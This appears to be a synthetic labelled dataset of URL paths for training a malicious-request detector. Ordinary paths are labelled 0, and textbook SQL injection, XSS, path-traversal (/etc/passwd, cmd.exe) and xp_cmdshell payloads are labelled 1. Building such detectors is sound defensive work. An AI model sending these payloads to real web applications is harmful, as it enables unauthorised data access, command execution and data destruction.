/login?page=2894,0
/login?sort=asc618,0
/index.html?category=tech152,0
/login?user=urmit875,0
/dashboard,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/login?sort=asc934,0
/checkout?page=2379,0
/api/users,0
"/api/users?search=UNION SELECT username, password FROM users",1
/about?id=1131,0
/login?category=tech300,0
/login?user=urmit744,0
/login?sort=asc837,0
/checkout?user=urmit507,0
/dashboard?category=tech82,0
/checkout?page=2946,0
/dashboard,0
/products/item?user=urmit130,0
/checkout?sort=asc230,0
/login?id=196,0
/checkout?search=?id=1; DROP TABLE users,1
/contact?search=<script>alert(document.cookie)</script>,1
/dashboard?page=2836,0
/products/item,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?user=urmit869,0
"/contact?search="" OR 1=1 --",1
/dashboard?category=tech600,0
/products/item?id=1445,0
/checkout,0
/api/users?page=2309,0
/contact?sort=asc292,0
/api/users?page=2880,0
/dashboard?id=1896,0
/products/item?category=tech490,0
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
"/about?search="" OR 1=1 --",1
/contact?sort=asc591,0
/../../../../etc/passwd,1
/dashboard?sort=asc273,0
/login?sort=asc7,0
/products/item?category=tech681,0
/dashboard,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?sort=asc790,0
/login?user=urmit720,0
/dashboard?sort=asc63,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/contact?page=2526,0
/index.html?page=2546,0
/login?id=1959,0
/products/item?user=urmit318,0
/index.html?id=1272,0
/index.html,0
/dashboard?user=urmit359,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?id=1406,0
/dashboard?user=urmit586,0
/checkout,0
/../../../../etc/passwd,1
/about,0
/products/item?page=2563,0
/login?id=1418,0
/contact,0
/?id=1; DROP TABLE users,1
/checkout?user=urmit276,0
/login?user=urmit86,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?page=2840,0
/about?search=?id=1; DROP TABLE users,1
/about?sort=asc670,0
/index.html?user=urmit725,0
/checkout,0
/checkout?user=urmit562,0
/about?category=tech878,0
/index.html?id=1108,0
/login?search=../../../../etc/passwd,1
/contact?id=178,0
/products/item?sort=asc864,0
/contact?category=tech46,0
/api/users,0
/dashboard?id=1376,0
/api/users?category=tech187,0
/contact?search=../../../../etc/passwd,1
/dashboard?sort=asc730,0
/checkout?sort=asc684,0
/index.html?sort=asc594,0
/products/item?search=../../../../etc/passwd,1
/login?user=urmit515,0
/products/item?page=2533,0
"/contact?search="" OR 1=1 --",1
/contact?id=1969,0
/checkout?category=tech305,0
/index.html?page=2571,0
/login?page=2849,0
/index.html?user=urmit887,0
/products/item?category=tech528,0
/api/users?search=javascript:eval('var a=1'),1
/<script>alert(document.cookie)</script>,1
/contact?page=2821,0
/checkout?search=<script>alert(document.cookie)</script>,1
/contact?user=urmit544,0
/checkout,0
/dashboard?user=urmit152,0
/../../../../etc/passwd,1
/checkout?sort=asc527,0
/api/users?sort=asc587,0
/dashboard?category=tech76,0
/about?user=urmit975,0
/about?id=1205,0
/checkout?search=javascript:eval('var a=1'),1
/index.html?sort=asc647,0
/dashboard?user=urmit28,0
/checkout,0
/products/item?user=urmit165,0
/checkout?category=tech371,0
/index.html?user=urmit474,0
"/products/item?search=UNION SELECT username, password FROM users",1
/index.html?id=1736,0
/checkout?id=1986,0
/about?search=?id=1; DROP TABLE users,1
/products/item?category=tech24,0
/contact?user=urmit435,0
/contact?page=2543,0
/checkout,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard,0
"/api/users?search=UNION SELECT username, password FROM users",1
/about?id=160,0
/api/users?id=1122,0
/api/users,0
/checkout?sort=asc432,0
/about?category=tech549,0
/checkout?user=urmit592,0
/contact?sort=asc700,0
/login?sort=asc597,0
/dashboard,0
/checkout?sort=asc293,0
/about?search=?id=1; DROP TABLE users,1
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?page=213,0
/contact?sort=asc248,0
/about?category=tech177,0
/dashboard?sort=asc474,0
/dashboard,0
/contact?page=2158,0
/login?sort=asc930,0
/dashboard?category=tech290,0
/about?id=1710,0
/about?id=1416,0
/about?user=urmit78,0
/products/item?page=2862,0
/dashboard?user=urmit763,0
/dashboard?page=2531,0
"/UNION SELECT username, password FROM users",1
/index.html?user=urmit351,0
/contact?user=urmit486,0
/dashboard?user=urmit268,0
/onload=prompt(1),1
/dashboard?sort=asc706,0
/checkout?sort=asc99,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users?search=../../../windows/system32/cmd.exe,1
/index.html?sort=asc826,0
/dashboard?id=1271,0
/contact?page=2808,0
/index.html?category=tech144,0
/login?page=2671,0
/checkout?category=tech69,0
/checkout?page=2759,0
/products/item?category=tech476,0
/contact?user=urmit872,0
/products/item?sort=asc569,0
/dashboard?id=1936,0
/index.html?sort=asc996,0
/api/users,0
/../../../windows/system32/cmd.exe,1
/products/item?id=1917,0
/about?user=urmit88,0
/index.html?category=tech208,0
/products/item?search=../../../../etc/passwd,1
/checkout?category=tech866,0
/about?page=2186,0
/index.html?id=1843,0
/api/users?id=1969,0
/index.html?id=1826,0
/about,0
/dashboard?user=urmit9,0
/about,0
/about?user=urmit908,0
/about?page=2328,0
/about?page=2507,0
/about?category=tech473,0
/dashboard?page=2345,0
/checkout?category=tech147,0
/contact?user=urmit831,0
/about?sort=asc827,0
/about?id=1270,0
/<script>alert(document.cookie)</script>,1
/dashboard?sort=asc3,0
/login?category=tech108,0
/admin' --,1
/dashboard?page=2829,0
/api/users?page=2201,0
/contact?page=221,0
/products/item?user=urmit153,0
/api/users?user=urmit498,0
/contact,0
/about?page=2723,0
/contact?user=urmit751,0
/api/users,0
/dashboard?id=1760,0
/products/item?page=2248,0
/api/users?id=1778,0
/dashboard?user=urmit129,0
/api/users?page=2693,0
/products/item?category=tech825,0
/products/item?category=tech40,0
/contact?sort=asc624,0
/products/item,0
/dashboard,0
/about?user=urmit190,0
/about?id=1198,0
/dashboard,0
/about?id=1304,0
/about?page=2338,0
/about?category=tech802,0
/contact?sort=asc219,0
/index.html?page=2559,0
/dashboard?id=1578,0
/api/users?page=2330,0
/about?id=1764,0
/api/users?page=2765,0
/onload=prompt(1),1
/api/users,0
/login?category=tech83,0
/about?user=urmit645,0
/contact?sort=asc253,0
/contact?page=2354,0
/api/users?page=2359,0
/dashboard?page=285,0
/checkout,0
/contact?id=1396,0
/dashboard?id=1425,0
/login?sort=asc407,0
/login?page=2265,0
/contact?category=tech316,0
/about?category=tech950,0
/contact?sort=asc36,0
/checkout,0
/contact?sort=asc986,0
/checkout?search=../../../windows/system32/cmd.exe,1
/api/users?page=2609,0
/contact?search='; EXEC xp_cmdshell('dir');--,1
/?id=1; DROP TABLE users,1
/login?user=urmit196,0
/products/item?id=1171,0
"/about?search=UNION SELECT username, password FROM users",1
/dashboard,0
/products/item?page=2538,0
/api/users,0
/contact,0
/login,0
/checkout?sort=asc554,0
/contact?id=17,0
/products/item?id=1928,0
/dashboard,0
/about?id=1222,0
/login,0
/admin' --,1
/api/users?sort=asc860,0
/products/item?category=tech517,0
/contact,0
/contact?page=2176,0
/about?id=1937,0
/index.html,0
/../../../windows/system32/cmd.exe,1
/api/users,0
/index.html?search=../../../windows/system32/cmd.exe,1
/api/users?search=' OR '1'='1,1
/../../../windows/system32/cmd.exe,1
/api/users?sort=asc768,0
/api/users?sort=asc588,0
/login,0
/login?sort=asc755,0
/checkout?page=2416,0
/contact?search=?id=1; DROP TABLE users,1
/api/users?search=javascript:eval('var a=1'),1
/checkout?id=1130,0
/about?page=2796,0
/dashboard,0
/login?search=' OR '1'='1,1
/dashboard?page=2387,0
/dashboard?user=urmit595,0
/products/item?page=2574,0
/index.html?search=javascript:eval('var a=1'),1
/dashboard?page=224,0
"/UNION SELECT username, password FROM users",1
/index.html?id=1953,0
/dashboard?page=2865,0
/index.html?user=urmit864,0
/index.html?id=1274,0
/api/users?sort=asc100,0
/api/users?user=urmit556,0
/contact?user=urmit448,0
/checkout?sort=asc106,0
/login?id=1910,0
/index.html?user=urmit707,0
/dashboard?sort=asc420,0
/products/item?page=2124,0
/api/users?sort=asc778,0
/dashboard?page=2237,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users?id=111,0
/checkout?user=urmit407,0
/login?search=' OR '1'='1,1
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/products/item?page=2861,0
/<script>alert(document.cookie)</script>,1
"/UNION SELECT username, password FROM users",1
"/contact?search=UNION SELECT username, password FROM users",1
/dashboard?user=urmit202,0
/dashboard?page=2867,0
/products/item?search=' OR '1'='1,1
/login?sort=asc228,0
/api/users?user=urmit993,0
/login?user=urmit648,0
/dashboard?page=2248,0
/checkout?page=2198,0
/index.html?page=2678,0
/products/item?user=urmit691,0
/products/item?user=urmit423,0
/contact?page=262,0
/index.html?user=urmit172,0
/api/users?id=1307,0
/login?id=1604,0
/about?sort=asc257,0
/about?category=tech283,0
/about?id=1310,0
/checkout?id=1904,0
/about?id=1350,0
/login,0
/checkout?category=tech237,0
/products/item?page=281,0
/login?page=2958,0
/api/users?id=1145,0
/contact?category=tech486,0
/index.html?id=1296,0
"/"" OR 1=1 --",1
/api/users?category=tech294,0
/about?search=onload=prompt(1),1
/contact?user=urmit151,0
/about?page=2754,0
/about?id=1997,0
/checkout?page=2177,0
/login?search=../../../../etc/passwd,1
/checkout?page=2251,0
/dashboard?sort=asc623,0
/contact?search=../../../../etc/passwd,1
/about?user=urmit893,0
/login?page=2402,0
/api/users?page=2106,0
/index.html?category=tech1,0
/products/item?page=2168,0
/dashboard,0
/api/users?category=tech182,0
/about,0
/api/users?user=urmit665,0
/api/users?search=?id=1; DROP TABLE users,1
/about?page=2652,0
/api/users?search=javascript:eval('var a=1'),1
/login?id=171,0
/dashboard,0
/index.html?user=urmit2,0
/api/users?search=javascript:eval('var a=1'),1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?user=urmit502,0
/checkout?page=2994,0
/checkout,0
/dashboard?category=tech803,0
/dashboard?page=2564,0
/contact,0
/admin' --,1
/index.html?sort=asc968,0
/checkout?category=tech829,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/contact?search=<script>alert(document.cookie)</script>,1
/api/users?search=admin' --,1
"/"" OR 1=1 --",1
/api/users?id=1918,0
/contact?sort=asc41,0
/contact?category=tech527,0
/api/users?user=urmit515,0
/login?user=urmit233,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/api/users?id=1848,0
/api/users?sort=asc608,0
/login,0
"/"" OR 1=1 --",1
/about?user=urmit95,0
/index.html?sort=asc859,0
/products/item?id=1173,0
/../../../../etc/passwd,1
/about?id=1974,0
/contact?user=urmit369,0
/products/item?page=281,0
/contact?page=2223,0
/index.html?id=1864,0
/api/users?page=2823,0
/checkout,0
/products/item?user=urmit345,0
/<script>alert(document.cookie)</script>,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?id=144,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?sort=asc136,0
/products/item?page=2759,0
/index.html?category=tech995,0
/checkout,0
/api/users?user=urmit576,0
/products/item?page=261,0
/dashboard?user=urmit279,0
/login?category=tech741,0
/'; EXEC xp_cmdshell('dir');--,1
/../../../../etc/passwd,1
/products/item?id=1716,0
/dashboard?search=../../../windows/system32/cmd.exe,1
/api/users?search=onload=prompt(1),1
/login,0
/api/users?user=urmit107,0
/products/item?id=1402,0
/index.html?sort=asc501,0
/about?page=2789,0
/dashboard?category=tech995,0
/dashboard?category=tech730,0
/checkout?search=javascript:eval('var a=1'),1
/about?page=2541,0
/checkout?user=urmit271,0
/about?page=2322,0
/admin' --,1
/dashboard?id=1639,0
/login?sort=asc765,0
/contact?page=2215,0
/dashboard,0
/api/users?category=tech292,0
/admin' --,1
/api/users?category=tech405,0
/api/users?search=?id=1; DROP TABLE users,1
/contact?category=tech664,0
/dashboard?id=141,0
/api/users?id=1558,0
/index.html?search=../../../windows/system32/cmd.exe,1
/about,0
/contact?category=tech510,0
/onload=prompt(1),1
/dashboard?sort=asc962,0
/checkout?id=1156,0
/checkout?search='; EXEC xp_cmdshell('dir');--,1
/about,0
/login?id=148,0
/onload=prompt(1),1
/api/users?id=1496,0
/products/item,0
/checkout?category=tech726,0
/dashboard?id=1262,0
/contact?id=198,0
/products/item?page=261,0
/dashboard?category=tech212,0
/api/users?search=../../../windows/system32/cmd.exe,1
/contact?page=2329,0
/checkout?category=tech108,0
"/api/users?search="" OR 1=1 --",1
/contact,0
/dashboard,0
/login?page=2435,0
/api/users?id=1827,0
/login?sort=asc92,0
/about?user=urmit799,0
/dashboard,0
/login,0
/about?category=tech802,0
/api/users?user=urmit790,0
/api/users?sort=asc517,0
/products/item?sort=asc232,0
/about?id=1503,0
/checkout?id=1391,0
/dashboard?id=1746,0
/checkout?page=2514,0
/products/item?search=../../../../etc/passwd,1
/checkout?sort=asc663,0
/contact?category=tech356,0
/contact?category=tech773,0
/contact?category=tech791,0
/contact?category=tech363,0
/api/users?id=1943,0
"/contact?search="" OR 1=1 --",1
/checkout?page=2558,0
/checkout?user=urmit575,0
/login?sort=asc846,0
/index.html?search=onload=prompt(1),1
/products/item?id=1887,0
/contact?id=12,0
/contact?user=urmit775,0
/products/item?sort=asc601,0
/about?sort=asc643,0
/index.html,0
/login?sort=asc618,0
/checkout,0
/about?search=../../../../etc/passwd,1
/products/item?page=2802,0
/api/users?id=1480,0
/checkout,0
/index.html?category=tech699,0
/dashboard?category=tech834,0
/login?category=tech572,0
/login?user=urmit784,0
/products/item?user=urmit802,0
/index.html?page=2928,0
"/products/item?search="" OR 1=1 --",1
/login?user=urmit899,0
/index.html?id=1807,0
/products/item,0
/contact?id=1216,0
/contact,0
/api/users?category=tech988,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?id=1526,0
/checkout?page=2906,0
"/login?search=UNION SELECT username, password FROM users",1
/checkout?user=urmit74,0
/about?search=javascript:eval('var a=1'),1
/products/item?user=urmit892,0
/contact?category=tech930,0
/checkout?id=1120,0
/checkout?category=tech593,0
/about?page=2670,0
/products/item?category=tech601,0
/contact?sort=asc89,0
/index.html?user=urmit511,0
/products/item?user=urmit589,0
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?search=../../../../etc/passwd,1
/index.html,0
/products/item?id=1514,0
/login?id=1697,0
/contact?id=1643,0
/login?page=2537,0
/about?id=1144,0
/index.html?id=1346,0
/login?page=21,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech392,0
/checkout?user=urmit323,0
/contact?category=tech302,0
/dashboard?search=../../../windows/system32/cmd.exe,1
/products/item?sort=asc418,0
/dashboard?category=tech296,0
/index.html?sort=asc578,0
/products/item,0
"/about?search=UNION SELECT username, password FROM users",1
/index.html?id=1922,0
/checkout?search=?id=1; DROP TABLE users,1
/checkout?category=tech563,0
/index.html,0
/products/item?category=tech777,0
/products/item?user=urmit535,0
/contact,0
/dashboard?id=1762,0
/../../../windows/system32/cmd.exe,1
/checkout?user=urmit918,0
/' OR '1'='1,1
"/about?search="" OR 1=1 --",1
/checkout?category=tech784,0
/about?category=tech153,0
/login?search=?id=1; DROP TABLE users,1
/contact?user=urmit176,0
/about?sort=asc296,0
/checkout?page=2559,0
/contact?user=urmit740,0
"/"" OR 1=1 --",1
/dashboard?search=<script>alert(document.cookie)</script>,1
/?id=1; DROP TABLE users,1
/about?id=112,0
/checkout?id=1715,0
/products/item?search=<script>alert(document.cookie)</script>,1
/contact?page=2743,0
/contact?page=2195,0
/index.html?user=urmit414,0
/checkout?page=2807,0
/dashboard?category=tech746,0
/contact?category=tech810,0
/products/item?id=1212,0
/index.html?category=tech598,0
/api/users?category=tech599,0
/contact?id=1322,0
/checkout?category=tech924,0
/api/users?id=1961,0
/about?search=../../../windows/system32/cmd.exe,1
/products/item?id=1498,0
/index.html?page=2449,0
/checkout?sort=asc283,0
/api/users,0
/index.html?user=urmit983,0
/about?id=1145,0
/contact?category=tech926,0
/index.html?search=admin' --,1
/api/users?category=tech290,0
/admin' --,1
/api/users?page=2940,0
/products/item?page=2938,0
/checkout?page=2788,0
/api/users?sort=asc572,0
/onload=prompt(1),1
/products/item?search=admin' --,1
/dashboard?sort=asc115,0
/login?page=2110,0
/checkout,0
/index.html?page=2929,0
/dashboard?id=1140,0
/contact?user=urmit618,0
/about?page=286,0
/contact?id=1370,0
/dashboard?user=urmit710,0
/index.html?page=23,0
/contact?sort=asc308,0
/dashboard?sort=asc761,0
/index.html?sort=asc407,0
/login?category=tech837,0
/dashboard,0
/index.html?user=urmit690,0
/index.html?user=urmit124,0
/login?category=tech947,0
/dashboard?category=tech809,0
/products/item,0
/about?user=urmit772,0
/index.html?category=tech312,0
/checkout?category=tech711,0
/about?sort=asc491,0
/javascript:eval('var a=1'),1
/login?id=1798,0
/dashboard?category=tech733,0
/login?category=tech392,0
/checkout?id=1600,0
/login?page=2552,0
/about,0
/login?page=2441,0
/api/users?page=2210,0
/login?user=urmit983,0
/api/users?category=tech492,0
/about?sort=asc370,0
/checkout?category=tech896,0
/products/item?id=1160,0
/login?user=urmit203,0
/contact?user=urmit704,0
/login?sort=asc350,0
/about?category=tech857,0
/api/users,0
/products/item?user=urmit428,0
/about?category=tech191,0
/api/users?id=1715,0
/checkout?user=urmit833,0
/products/item?user=urmit217,0
/dashboard?category=tech595,0
/about?id=1690,0
"/checkout?search="" OR 1=1 --",1
/dashboard?id=1773,0
/checkout?sort=asc170,0
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/api/users?user=urmit817,0
/products/item?page=2106,0
/api/users?search=onload=prompt(1),1
"/contact?search="" OR 1=1 --",1
/login?search=?id=1; DROP TABLE users,1
/contact?category=tech290,0
/checkout?id=1244,0
/login?search=../../../windows/system32/cmd.exe,1
/products/item?id=1631,0
/api/users?category=tech724,0
/contact?search=../../../windows/system32/cmd.exe,1
/checkout?id=170,0
/about,0
/about?user=urmit340,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/about,0
/checkout?page=2653,0
/api/users?sort=asc849,0
/checkout?sort=asc626,0
/api/users?page=2889,0
/dashboard?user=urmit830,0
/checkout?user=urmit595,0
/onload=prompt(1),1
/api/users?sort=asc223,0
/admin' --,1
/contact?user=urmit143,0
/dashboard?sort=asc285,0
/products/item?sort=asc323,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users?user=urmit783,0
/' OR '1'='1,1
/products/item?search=admin' --,1
/checkout?id=1603,0
/about?sort=asc974,0
/contact?page=2561,0
/login,0
/index.html?search=javascript:eval('var a=1'),1
/checkout?page=2260,0
/checkout?sort=asc837,0
/products/item?category=tech243,0
/onload=prompt(1),1
/contact?category=tech880,0
/contact,0
/login,0
/dashboard?id=1669,0
/checkout,0
/contact?category=tech475,0
/index.html?user=urmit406,0
/api/users?id=1326,0
/products/item?sort=asc65,0
/dashboard?id=1312,0
/index.html?search=../../../../etc/passwd,1
/checkout?page=2764,0
/checkout?user=urmit547,0
/about?sort=asc575,0
/api/users?category=tech299,0
/contact?id=1489,0
/dashboard?id=1207,0
/api/users?category=tech502,0
"/dashboard?search="" OR 1=1 --",1
/login?category=tech90,0
/api/users,0
"/checkout?search="" OR 1=1 --",1
/dashboard,0
/dashboard?page=2198,0
/products/item,0
/contact?user=urmit990,0
/dashboard?sort=asc733,0
/checkout?id=1577,0
/login?page=2787,0
/contact?user=urmit151,0
/contact?category=tech936,0
/checkout?category=tech71,0
/api/users,0
/dashboard?page=2113,0
/products/item?search=../../../../etc/passwd,1
/index.html,0
/dashboard,0
/contact,0
/index.html?sort=asc238,0
/contact?sort=asc439,0
/index.html?user=urmit433,0
/about?category=tech895,0
/contact?id=1154,0
/products/item?page=2461,0
/admin' --,1
/login?page=2844,0
/index.html?page=2614,0
/index.html?sort=asc768,0
/contact?category=tech111,0
/dashboard?page=2713,0
/checkout?user=urmit985,0
/login?category=tech33,0
/index.html?user=urmit83,0
/login,0
/index.html?id=1690,0
"/login?search=UNION SELECT username, password FROM users",1
/products/item?user=urmit748,0
/contact,0
/login?category=tech292,0
/products/item?category=tech553,0
/dashboard,0
/contact,0
/dashboard?page=2531,0
/api/users?page=2956,0
/dashboard?user=urmit147,0
/dashboard?category=tech263,0
/index.html?user=urmit630,0
/index.html?sort=asc256,0
/index.html?page=2623,0
/about?category=tech386,0
/checkout,0
/products/item?page=2469,0
/dashboard,0
/contact?sort=asc242,0
/about?sort=asc120,0
/products/item?user=urmit356,0
/about?page=240,0
/checkout?page=290,0
/about?category=tech459,0
/javascript:eval('var a=1'),1
/about?page=214,0
/about?category=tech767,0
/contact?category=tech274,0
/index.html?user=urmit399,0
/about?page=2337,0
/?id=1; DROP TABLE users,1
/../../../windows/system32/cmd.exe,1
/api/users?page=2405,0
"/api/users?search="" OR 1=1 --",1
/checkout,0
/products/item?page=2169,0
/products/item?id=1718,0
/dashboard?category=tech771,0
/dashboard?sort=asc256,0
/checkout?id=1838,0
/api/users?page=2646,0
/login?id=1329,0
/contact?sort=asc819,0
/checkout,0
/dashboard?page=2324,0
/checkout?sort=asc862,0
/login?search=admin' --,1
/dashboard?category=tech246,0
/login?user=urmit360,0
/api/users?page=2903,0
/products/item,0
/api/users?sort=asc137,0
/login?page=2954,0
/about?id=1105,0
/api/users?id=1209,0
/api/users?category=tech259,0
/'; EXEC xp_cmdshell('dir');--,1
/about,0
/dashboard?page=2331,0
/about?category=tech850,0
/<script>alert(document.cookie)</script>,1
/' OR '1'='1,1
/products/item?id=1738,0
/dashboard?search=javascript:eval('var a=1'),1
/about,0
/index.html,0
/dashboard?user=urmit651,0
/index.html?sort=asc564,0
/checkout?search=../../../../etc/passwd,1
/about,0
/about,0
/dashboard?user=urmit446,0
"/index.html?search=UNION SELECT username, password FROM users",1
/dashboard?page=2996,0
/login?category=tech830,0
/contact?sort=asc446,0
/products/item,0
/'; EXEC xp_cmdshell('dir');--,1
/contact?id=1850,0
/checkout?user=urmit650,0
/products/item?id=1437,0
/api/users?page=2244,0
/checkout?user=urmit722,0
/about?id=1353,0
/checkout?sort=asc778,0
/api/users?id=1272,0
/about?id=1360,0
"/dashboard?search=UNION SELECT username, password FROM users",1
/dashboard,0
/products/item?id=1916,0
/contact?id=1702,0
/checkout?user=urmit405,0
/contact?page=2375,0
/about?id=1894,0
/dashboard?id=1662,0
/checkout?sort=asc517,0
/api/users?sort=asc784,0
/api/users,0
/dashboard?id=1365,0
/dashboard?id=1603,0
/api/users,0
/dashboard?category=tech754,0
/checkout?sort=asc228,0
/about?user=urmit236,0
/products/item?id=1594,0
/admin' --,1
/onload=prompt(1),1
/dashboard?category=tech449,0
/contact?category=tech745,0
/<script>alert(document.cookie)</script>,1
/contact?category=tech426,0
/dashboard?id=1927,0
/dashboard?sort=asc958,0
/products/item?user=urmit102,0
/about?sort=asc993,0
/index.html?sort=asc135,0
/dashboard?id=1317,0
/contact,0
/products/item?user=urmit281,0
/index.html?sort=asc252,0
/about?page=2127,0
/dashboard?sort=asc18,0
/contact?category=tech218,0
/login?sort=asc650,0
/contact?category=tech950,0
/about?id=1593,0
/contact,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?category=tech113,0
/about?page=2482,0
/index.html?id=1190,0
/contact?page=255,0
/login?sort=asc667,0
/api/users?sort=asc533,0
/contact?id=1709,0
/about?user=urmit647,0
/onload=prompt(1),1
/dashboard?sort=asc763,0
/api/users?page=2364,0
/api/users?page=2709,0
"/UNION SELECT username, password FROM users",1
/index.html?id=1718,0
/index.html?search=../../../../etc/passwd,1
/checkout?id=12,0
/login?category=tech906,0
/dashboard?search=?id=1; DROP TABLE users,1
/checkout?category=tech298,0
/about?sort=asc368,0
/api/users?user=urmit736,0
/products/item?id=1390,0
/onload=prompt(1),1
/dashboard,0
/api/users?page=2764,0
/contact?category=tech625,0
"/UNION SELECT username, password FROM users",1
/login?page=2488,0
/login,0
/contact?id=1890,0
/products/item?sort=asc170,0
/dashboard?page=2921,0
/products/item?search=javascript:eval('var a=1'),1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?page=2148,0
/contact?id=1496,0
/checkout?category=tech131,0
/dashboard?page=2469,0
/products/item?user=urmit151,0
/dashboard?id=1866,0
/checkout?category=tech739,0
/api/users?page=2309,0
/login?page=2694,0
/api/users?category=tech685,0
/dashboard?sort=asc285,0
/contact?page=2288,0
/' OR '1'='1,1
/api/users?user=urmit124,0
/checkout?id=131,0
/api/users?user=urmit417,0
/index.html?id=1524,0
/index.html?sort=asc693,0
/login?category=tech444,0
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?id=1583,0
/checkout?category=tech752,0
/<script>alert(document.cookie)</script>,1
/login?id=1327,0
/checkout?id=1454,0
/index.html?page=2256,0
/api/users?sort=asc183,0
/api/users,0
/about?sort=asc528,0
/checkout?page=252,0
/dashboard,0
/checkout?page=2741,0
/about?id=1664,0
/checkout?id=1263,0
/index.html,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/index.html?sort=asc7,0
/checkout?page=2185,0
/login?search=' OR '1'='1,1
/login?category=tech153,0
/dashboard?category=tech798,0
/contact?page=2145,0
/index.html?user=urmit25,0
/admin' --,1
"/"" OR 1=1 --",1
/dashboard?sort=asc966,0
/index.html?search=../../../windows/system32/cmd.exe,1
/'; EXEC xp_cmdshell('dir');--,1
/dashboard?user=urmit232,0
/api/users?sort=asc155,0
/dashboard?id=182,0
/index.html,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?page=2490,0
/contact?user=urmit35,0
/admin' --,1
/../../../../etc/passwd,1
/index.html?page=2125,0
/checkout?page=2625,0
/index.html?page=2468,0
/checkout?user=urmit515,0
/checkout?sort=asc446,0
/dashboard?id=1715,0
/products/item?user=urmit920,0
/checkout?id=180,0
/contact?search=?id=1; DROP TABLE users,1
/about?page=2895,0
/index.html?page=2334,0
/onload=prompt(1),1
/checkout,0
/index.html?user=urmit92,0
/dashboard?category=tech101,0
/login?user=urmit671,0
/login?search=?id=1; DROP TABLE users,1
/login?page=2350,0
/index.html?category=tech630,0
/about,0
/dashboard?id=1583,0
/login?user=urmit709,0
/about?page=292,0
/products/item?sort=asc23,0
/dashboard?category=tech15,0
/index.html?page=28,0
/products/item?id=166,0
/<script>alert(document.cookie)</script>,1
/products/item?search=<script>alert(document.cookie)</script>,1
/products/item?sort=asc14,0
/index.html?sort=asc813,0
/contact?user=urmit462,0
/login?sort=asc839,0
/about?sort=asc964,0
/login,0
/about?user=urmit870,0
/login?page=2696,0
/checkout?sort=asc619,0
/products/item?page=2876,0
/dashboard,0
/checkout?search=../../../windows/system32/cmd.exe,1
/index.html?user=urmit447,0
/index.html,0
/contact,0
/login?page=2476,0
/index.html,0
/api/users?category=tech78,0
/?id=1; DROP TABLE users,1
/products/item?category=tech394,0
"/about?search="" OR 1=1 --",1
/' OR '1'='1,1
/api/users,0
/api/users?sort=asc82,0
/products/item,0
/index.html?id=155,0
/contact?user=urmit833,0
/contact?user=urmit575,0
/../../../../etc/passwd,1
/login?page=269,0
/products/item?search=<script>alert(document.cookie)</script>,1
/dashboard?id=1554,0
/index.html?page=2735,0
/products/item?sort=asc417,0
/api/users?category=tech528,0
/contact?category=tech432,0
/login?category=tech899,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?user=urmit172,0
/checkout,0
/about?id=1207,0
/../../../windows/system32/cmd.exe,1
/' OR '1'='1,1
/login?id=1974,0
/dashboard?id=1536,0
/products/item,0
/api/users?user=urmit130,0
/products/item?sort=asc100,0
/checkout?id=1134,0
/api/users?id=1227,0
/login,0
/javascript:eval('var a=1'),1
/../../../../etc/passwd,1
/products/item,0
/contact?category=tech32,0
/login?sort=asc133,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?category=tech448,0
/api/users?search=' OR '1'='1,1
/products/item?category=tech565,0
/api/users?sort=asc984,0
/checkout?page=2159,0
/dashboard?user=urmit616,0
/api/users?sort=asc363,0
/checkout,0
/login?sort=asc613,0
/checkout?id=1592,0
/contact?sort=asc530,0
/checkout?user=urmit698,0
/contact?search=?id=1; DROP TABLE users,1
/contact?category=tech288,0
/contact?page=2417,0
/checkout,0
/contact?sort=asc420,0
/contact,0
/onload=prompt(1),1
/products/item?category=tech117,0
/login?search=<script>alert(document.cookie)</script>,1
/api/users?page=2830,0
/about,0
/checkout?category=tech313,0
/login?category=tech351,0
/checkout?search=../../../windows/system32/cmd.exe,1
/api/users?category=tech440,0
/about?search=admin' --,1
/api/users?search=javascript:eval('var a=1'),1
/index.html?page=240,0
/contact?id=1847,0
/checkout?page=2515,0
/about?user=urmit422,0
/<script>alert(document.cookie)</script>,1
/api/users?user=urmit644,0
/' OR '1'='1,1
/about?sort=asc717,0
/dashboard?category=tech596,0
/checkout,0
/api/users?sort=asc769,0
/dashboard?page=2997,0
/'; EXEC xp_cmdshell('dir');--,1
/contact?category=tech899,0
/checkout?sort=asc380,0
/login?page=2319,0
/about?page=21,0
/index.html?category=tech720,0
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?id=1871,0
/dashboard?category=tech720,0
/index.html?user=urmit174,0
/dashboard,0
/about,0
/login?category=tech221,0
/contact?user=urmit139,0
/checkout?category=tech487,0
/api/users?id=1826,0
/dashboard?category=tech205,0
/index.html?id=1435,0
/dashboard?sort=asc182,0
/contact,0
/login,0
/login?page=2119,0
/index.html?sort=asc205,0
